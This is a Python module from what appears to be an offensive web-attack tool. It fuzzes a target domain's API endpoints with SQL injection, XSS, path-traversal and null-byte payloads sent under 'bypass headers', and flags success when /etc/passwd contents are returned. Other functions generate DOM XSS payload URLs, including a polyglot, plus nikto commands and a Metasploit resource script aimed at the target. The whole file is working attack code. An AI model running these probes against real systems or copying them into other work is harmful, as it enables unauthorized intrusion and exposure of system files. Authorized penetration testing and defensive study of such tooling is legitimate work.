import requests
from urllib.parse import urljoin
from modules.config import get_bypass_headers

def api_zombie_fuzzer(endpoints, domain):
    if not endpoints: return ""
    report = ["\n[*] API ZOMBIE (FUZZING):"]
    base_url = f"http://{domain}"
    payloads = ["' OR 1=1 --", "<script>alert(1)</script>", "../../../../etc/passwd", "%00"]
    vuln_found = False
    
    for ep in list(endpoints)[:10]:
        target = urljoin(base_url, ep)
        for pay in payloads:
            try:
                r = requests.get(f"{target}?q={pay}", headers=get_bypass_headers(), timeout=2)
                
                if r.status_code == 500:
                    report.append(f"   [⚠️] API WARNING: 500 Error caused by payload (Potential DoS/Bug):")
                    report.append(f"       > URL: {target}")
                    report.append(f"       > Payload: {pay}")
                    vuln_found = True
                elif "root:x:0:0" in r.text:
                    report.append(f"   [☠️] API EXPLOIT SUCCESS (LFI): {target}")
                    vuln_found = True; break
            except: pass
            
    if not vuln_found: report.append("   [✓] APIs seem resilient.")
    return "\n".join(report)

def generate_dom_payloads(url, sink_type):
    report = [f"\n[*] DOM EXPLOIT SUGGESTIONS for {sink_type}:"]
    polyglot = "javascript://%250Aalert(1)//\"/*\\'/*\"/*--></Script><Image Src=x OnError=alert(1)>"
    
    payloads = []
    if "innerHTML" in sink_type:
        payloads = [
            f"{url}#<img src=x onerror=alert(1)>", 
            f"{url}?q=<svg/onload=alert(1)>", 
            f"{url}?q=<iframe src=javascript:alert(1)>"
        ]
    elif "eval" in sink_type:
        payloads = [
            f"{url}?q=alert(1)", 
            f"{url}?q=1;alert(1)"
        ]
    elif "location" in sink_type:
        payloads = [f"{url}?next=javascript:alert(1)"]
    else:
        payloads = [f"{url}#{polyglot}"]

    report.append("   [i] Manual Verification Required. Try these in Browser:")
    for p in payloads:
        report.append(f"       > {p}")
        
    return "\n".join(report)

def generate_attack_commands(domain, scan_text, tech_list):
    cmds = ["\n[*] WEAPONIZER:"]
    if "80/tcp" in scan_text: cmds.append(f"   [WEB] nikto -h {domain}")
    return "\n".join(cmds)

def generate_metasploit_script(domain, scan_text):
    msf = ["\n[*] METASPLOIT SCRIPT (RCE):"]
    script = [f"workspace -a {domain}", f"db_nmap -sV {domain}"]
    if "80/tcp" in scan_text:
        script.append("use auxiliary/scanner/http/dir_scanner")
        script.append(f"set RHOSTS {domain}")
        script.append("run")
    msf.append("\n".join(script))
    msf.append("[i] Save as 'attack.rc' and run: msfconsole -r attack.rc")
    return "\n".join(msf)